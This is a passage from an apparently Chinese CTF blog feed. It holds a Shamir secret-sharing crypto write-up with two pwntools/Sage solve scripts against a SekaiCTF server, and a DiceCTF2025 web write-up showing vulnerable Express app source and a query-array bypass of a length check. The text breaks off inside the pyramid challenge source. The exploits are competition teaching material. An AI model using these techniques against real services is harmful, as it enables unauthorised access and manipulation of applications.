[20,50]$<br>$可以找到生成元g生成的循环子群<g>=\{g^{0},g^{1},…,g^{t-1}\}$<br>$g^{t}\equiv 1\pmod p$<br>$取x_{i}=g^{i}\pmod p，t次单位根，得到下面的式子$</p><p>$f(x)=P_{t-1}(x)+C(x^{t}-1)$</p><p>$P_{t-1}(x)=R.lagrange_polynomial(shares)=a_{t-1}x^{t-1}+…+a_{1}x+a_{0}$</p><p>$c_{t}x^{t}+…+c_{1}x+c_{0}=C\cdot x^{t}+a_{t-1}x^{t-1}+…+a_{1}x+(a_{0}-C)$</p><p>$c_{t}=C$<br>$c_{t-1}=a_{t-1},…,c_{1}=a_{1}$<br>$c_{0}=a_{0}-C$</p><p>$借助sage自带的拉格朗日差值公式，取两次多项式系数的交集就可以得到secret(两次secret都要落在[c_{1}-c_{t-1}])$</p><p>$注意g^{t}=1\pmod p，这样的g只有t个，直接找概率很低$<br>$我们构造h=base^{\frac{p-1}{t}}\pmod p$<br>$h^{t}=1\pmod p，ord(h)\ |\ t，if\ h\not = 1，ord(h)=t$<br>$这样P(h\not =1)=1-\frac{(p-1)/t}{p-1}=28/29$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">256</span> - <span class="number">189</span></span><br><span class="line">R.&lt;x0&gt; = GF(p)[]</span><br><span class="line">t = <span class="number">29</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># conn = process([&quot;python3&quot;, &quot;../dist/chall.py&quot;])</span></span><br><span class="line">conn = remote(<span class="string">&#x27;ssss.chals.sekai.team&#x27;</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>():</span><br><span class="line">  conn.sendline(<span class="built_in">str</span>(t).encode())</span><br><span class="line">  g = <span class="number">2</span></span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">pow</span>(g, (p-<span class="number">1</span>)//t, p) == <span class="number">1</span>:</span><br><span class="line">    g += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  g = <span class="built_in">pow</span>(g, (p-<span class="number">1</span>)//t, p)</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">pow</span>(g, t, p) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  shares = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">    x = <span class="built_in">pow</span>(g, i, p)</span><br><span class="line">    conn.sendline(<span class="built_in">str</span>(x).encode())</span><br><span class="line">    y = <span class="built_in">int</span>(conn.recvline())</span><br><span class="line">    shares.append((x, y))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">list</span>(R.lagrange_polynomial(shares))</span><br><span class="line"></span><br><span class="line">A = query()</span><br><span class="line">conn.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">conn.recvline()  <span class="comment"># :&lt;</span></span><br><span class="line"></span><br><span class="line">B = query()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> secret <span class="keyword">in</span> A:</span><br><span class="line">  <span class="keyword">if</span> secret <span class="keyword">in</span> B:</span><br><span class="line">    conn.sendline(<span class="built_in">str</span>(secret).encode())</span><br><span class="line">    <span class="built_in">print</span>(conn.recvline().decode().strip())</span><br></pre></td></tr></table></figure><p>$这个是春哥的思路，直接到了底层$</p><script type="math/tex; mode=display">\left [ \begin{matrix}x_1^0 & x_1^1 & \dots & x_1^{t-1} \\x_2^0 & x_2^1 & \dots & x_2^{t-1} \\\vdots & \vdots & \ddots & \vdots \\x_t^0 & x_t^1 & \dots & x_t^{t-1}\end{matrix} \right ]\cdot\left [ \begin{matrix}c_0 \\c_1 \\\vdots \\c_{t-1}\end{matrix} \right ]\ =\left [ \begin{matrix}y_1 \\y_2 \\\vdots \\y_t\end{matrix} \right ]</script><p>$A\cdot c=b，A称为范德蒙德矩阵，只要所有的x_{j}互不相同，这个矩阵就是可逆的，方程就有唯一解c$<br>$范德蒙德矩阵是拉格朗日差值公式的基础，又从春哥那学到知识了$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Gao</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># self.conn = process([&#x27;python3&#x27;, &#x27;another.py&#x27;])</span></span><br><span class="line">        self.conn = remote(<span class="string">&#x27;ssss.chals.sekai.team&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">        self.p = <span class="number">2</span> ** <span class="number">256</span> - <span class="number">189</span></span><br><span class="line">        self.Zp = Zmod(self.p)</span><br><span class="line">        self.g = <span class="number">68182365146192563136101852599586284510469631280758214998024143739738246750499</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gao_1</span>(<span class="params">self</span>):</span><br><span class="line">        Zp = self.Zp</span><br><span class="line">        g = Zp(self.g)</span><br><span class="line"></span><br><span class="line">        t = <span class="number">29</span></span><br><span class="line">        self.conn.sendline(<span class="built_in">str</span>(t))</span><br><span class="line">        A, b = [], []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">            x = g ** j</span><br><span class="line">            self.conn.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">            y = <span class="built_in">int</span>(self.conn.recvline())</span><br><span class="line">            A.append([Zp(x) ** i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t)])</span><br><span class="line">            b.append(Zp(y))</span><br><span class="line">        A = matrix(Zp, A)</span><br><span class="line">        b = vector(Zp, b)</span><br><span class="line">        x = A.solve_right(b)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">set</span>(x.<span class="built_in">list</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gao</span>(<span class="params">self</span>):</span><br><span class="line">        a = self.gao_1()</span><br><span class="line">        self.conn.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        self.conn.recvline()</span><br><span class="line">        b = self.gao_1()</span><br><span class="line">        num = a &amp; b</span><br><span class="line">        <span class="built_in">print</span>(num)</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(num) == <span class="number">1</span>, <span class="string">&quot;Multiple secrets found&quot;</span></span><br><span class="line">        secret = num.pop()</span><br><span class="line">        self.conn.sendline(<span class="built_in">str</span>(secret))</span><br><span class="line">        self.conn.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    g = Gao()</span><br><span class="line">    g.gao()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里也记录一下，各种比赛零零散散的题目(觉得比较有意思的)&lt;/p&gt;
&lt;h1 id=&quot;KalmarCTF2025-basic-sums&quot;&gt;&lt;a href=&quot;#KalmarCTF2025-basic-sums&quot; class=&quot;headerlink&quot; title=&quot;KalmarC</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DiceCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/03/31/DiceCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/03/31/DiceCTF2025-WriteUp/</id>
    <published>2025-03-30T17:38:57.000Z</published>
    <updated>2025-04-01T19:11:05.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="cookie-recipes-v3"><a href="#cookie-recipes-v3" class="headerlink" title="cookie-recipes-v3"></a>cookie-recipes-v3</h2><blockquote><p>Mmmmmmm…</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cookies = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> cookies = req.<span class="property">headers</span>.<span class="property">cookie</span></span><br><span class="line">    <span class="keyword">const</span> user = cookies?.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)?.[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user) &#123; req.<span class="property">user</span> = user &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> id = <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">slice</span>(<span class="number">2</span>)</span><br><span class="line">        res.<span class="title function_">setHeader</span>(<span class="string">&#x27;set-cookie&#x27;</span>, <span class="string">`user=<span class="subst">$&#123;id&#125;</span>`</span>)</span><br><span class="line">        req.<span class="property">user</span> = id</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> count = cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span></span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">send</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/@exampledev/new.css@1/new.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;link rel=&quot;stylesheet&quot; href=&quot;https://fonts.xz.style/serve/inter.css&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;You have &lt;span&gt;<span class="subst">$&#123;count&#125;</span>&lt;/span&gt; cookies&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;button id=&quot;basic&quot;&gt;Basic cookie recipe (makes one)&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;button id=&quot;advanced&quot;&gt;Advanced cookie recipe (makes a dozen)&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;button disabled&gt;Super cookie recipe (makes a million)&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;button id=&quot;deliver&quot;&gt;Deliver cookies&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;script src=&quot;/script.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/script.js&#x27;</span>, <span class="function">(<span class="params">_req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;js&#x27;</span>).<span class="title function_">send</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        const basic = document.querySelector(&#x27;#basic&#x27;)</span></span><br><span class="line"><span class="string">        const advanced = document.querySelector(&#x27;#advanced&#x27;)</span></span><br><span class="line"><span class="string">        const deliver = document.querySelector(&#x27;#deliver&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        const showCookies = (number) =&gt; &#123;</span></span><br><span class="line"><span class="string">            const span = document.querySelector(&#x27;span&#x27;)</span></span><br><span class="line"><span class="string">            span.textContent = number</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        basic.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span></span><br><span class="line"><span class="string">            const res = await fetch(&#x27;/bake?number=1&#x27;, &#123; method: &#x27;POST&#x27; &#125;)</span></span><br><span class="line"><span class="string">            const number = await res.text()</span></span><br><span class="line"><span class="string">            showCookies(+number)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        advanced.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span></span><br><span class="line"><span class="string">            const res = await fetch(&#x27;/bake?number=12&#x27;, &#123; method: &#x27;POST&#x27; &#125;)</span></span><br><span class="line"><span class="string">            const number = await res.text()</span></span><br><span class="line"><span class="string">            showCookies(+number)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        deliver.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span></span><br><span class="line"><span class="string">            const res = await fetch(&#x27;/deliver&#x27;, &#123; method: &#x27;POST&#x27; &#125;)</span></span><br><span class="line"><span class="string">            const text = await res.text()</span></span><br><span class="line"><span class="string">            alert(text)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/bake&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = req.<span class="property">query</span>.<span class="property">number</span></span><br><span class="line">    <span class="keyword">if</span> (!number) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;missing number&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (number.<span class="property">length</span> &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        cookies.<span class="title function_">set</span>(req.<span class="property">user</span>, (cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span>) + <span class="title class_">Number</span>(number))</span><br><span class="line">        res.<span class="title function_">end</span>(cookies.<span class="title function_">get</span>(req.<span class="property">user</span>).<span class="title function_">toString</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;that is too many cookies&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/deliver&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> current = cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span></span><br><span class="line">    <span class="keyword">const</span> target = <span class="number">1_000_000_000</span></span><br><span class="line">    <span class="keyword">if</span> (current &lt; target) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">`not enough (need <span class="subst">$&#123;target - current&#125;</span>) more`</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(process.<span class="property">env</span>.<span class="property">FLAG</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>点击量需要十亿次</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/bake&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = req.<span class="property">query</span>.<span class="property">number</span></span><br><span class="line">    <span class="keyword">if</span> (!number) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;missing number&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (number.<span class="property">length</span> &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        cookies.<span class="title function_">set</span>(req.<span class="property">user</span>, (cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span>) + <span class="title class_">Number</span>(number))</span><br><span class="line">        res.<span class="title function_">end</span>(cookies.<span class="title function_">get</span>(req.<span class="property">user</span>).<span class="title function_">toString</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;that is too many cookies&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>限制了我们传入的数字字符串<code>number</code>长度<code>小于等于2</code>，这里可以用<strong>数组绕过</strong>，从而检验的是<strong>数组的长度</strong>，而不是<strong>字符串长度</strong><br><code>POST /bake?number[]=99999999999999</code></p><h2 id="pyramid-复现学习"><a href="#pyramid-复现学习" class="headerlink" title="pyramid(复现学习)"></a>pyramid(复现学习)</h2><blockquote><p>Would you like to buy some supplements?</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> css = <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;link</span></span><br><span class="line"><span class="string">        rel=&quot;stylesheet&quot;</span></span><br><span class="line"><span class="string">        href=&quot;https://unpkg.com/axist@latest/dist/axist.min.css&quot;</span></span><br><span class="line"><span class="string">    &gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> users = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"><span class="keyword">const</span> codes = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">random</span> = (<span class="params"></span>) =&gt; crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">escape</span> = (<span class="params">str</span>) =&gt; str.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">referrer</span> = (<span class="params">code</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (code &amp;&amp; codes.<span class="title function_">has</span>(code)) &#123;</span><br><span class="line">        <span class="keyword">const</span> token = codes.<span class="title function_">get</span>(code)</span><br><span class="line">        <span class="keyword">if</span> (users.<span class="title function_">has</span>(token)) &#123;</span><br><span class="line">            <span class="keyword">return</span> users.<span class="title function_">get</span>(token)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, _res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">headers</span>.<span class="property">cookie</span>?.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)?.[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        req.<span class="property">token</span> = token</span><br><span class="line">        <span class="keyword">if</span> (users.<span class="title function_">has</span>(token)) &#123;</span><br><span class="line">            req.<span class="property">user</span> = users.<span class="title function_">get</span>(token)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">            &lt;h1&gt;Account: <span class="subst">$&#123;<span class="built_in">escape</span>(req.user.name)&#125;</span>&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            You have &lt;strong&gt;<span class="subst">$&#123;req.user.bal&#125;</span>&lt;/strong&gt; coins.</span></span><br><span class="line"><span class="string">            You have referred &lt;strong&gt;<span class="subst">$&#123;req.user.ref&#125;</span>&lt;/strong&gt; users.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;hr&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/code&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;Generate referral code&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/cashout&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">                    Cashout <span class="subst">$&#123;req.user.ref&#125;</span> referrals</span></span><br><span class="line"><span class="string">                &lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/buy&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;Purchase flag&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">            &lt;h1&gt;Register&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/new&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input name=&quot;name&quot; type=&quot;text&quot; placeholder=&quot;Name&quot; required&gt;</span></span><br><span class="line"><span class="string">                &lt;input</span></span><br><span class="line"><span class="string">                    name=&quot;refer&quot;</span></span><br><span class="line"><span class="string">                    type=&quot;text&quot;</span></span><br><span class="line"><span class="string">                    placeholder=&quot;Referral code (optional)&quot;</span></span><br><span class="line"><span class="string">                &gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;Register&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/new&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = <span class="title function_">random</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> body = []</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span>.<span class="title function_">bind</span>(body))</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>(body).<span class="title function_">toString</span>()</span><br><span class="line">        <span class="keyword">const</span> parsed = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(data)</span><br><span class="line">        <span class="keyword">const</span> name = parsed.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>)?.<span class="title function_">toString</span>() ?? <span class="string">&#x27;JD&#x27;</span></span><br><span class="line">        <span class="keyword">const</span> code = parsed.<span class="title function_">get</span>(<span class="string">&#x27;refer&#x27;</span>) ?? <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// referrer receives the referral</span></span><br><span class="line">        <span class="keyword">const</span> r = <span class="title function_">referrer</span>(code)</span><br><span class="line">        <span class="keyword">if</span> (r) &#123; r.<span class="property">ref</span> += <span class="number">1</span> &#125;</span><br><span class="line"></span><br><span class="line">        users.<span class="title function_">set</span>(token, &#123;</span><br><span class="line">            name,</span><br><span class="line">            code,</span><br><span class="line">            <span class="attr">ref</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">bal</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">header</span>(<span class="string">&#x27;set-cookie&#x27;</span>, <span class="string">`token=<span class="subst">$&#123;token&#125;</span>`</span>)</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/code&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">token</span></span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        <span class="keyword">const</span> code = <span class="title function_">random</span>()</span><br><span class="line">        codes.<span class="title function_">set</span>(code, token)</span><br><span class="line">        res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">            &lt;h1&gt;Referral code generated&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Your code: &lt;strong&gt;<span class="subst">$&#123;code&#125;</span>&lt;/strong&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">end</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// referrals translate 1:1 to coins</span></span><br><span class="line"><span class="comment">// you receive half of your referrals as coins</span></span><br><span class="line"><span class="comment">// your referrer receives the other half as kickback</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// if your referrer is null, you can turn all referrals into coins</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/cashout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> u = req.<span class="property">user</span></span><br><span class="line">        <span class="keyword">const</span> r = <span class="title function_">referrer</span>(u.<span class="property">code</span>)</span><br><span class="line">        <span class="keyword">if</span> (r) &#123;</span><br><span class="line">            [u.<span class="property">ref</span>, r.<span class="property">ref</span>, u.<span class="property">bal</span>] = [<span class="number">0</span>, r.<span class="property">ref</span> + u.<span class="property">ref</span> / <span class="number">2</span>, u.<span class="property">bal</span> + u.<span class="property">ref</span> / <span class="number">2</span>]</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            [u.<span class="property">ref</span>, u.<span class="property">bal</span>] = [<span class="number">0</span>, u.<span class="property">bal</span> + u.<span class="property">ref</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/buy&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> user = req.<span class="property">user</span></span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">bal</span> &gt; <span class="number">100_000_000_000</span>) &#123;</span><br><span class="line">            user.<span class="property">bal</span> -= <span class="number">100_000_000_000</span></span><br><span class="line">            res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">                <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">                &lt;h1&gt;Successful purchase&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;<span class="subst">$&#123;process.env.FLAG&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            `</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">        &lt;h1&gt;Not enough 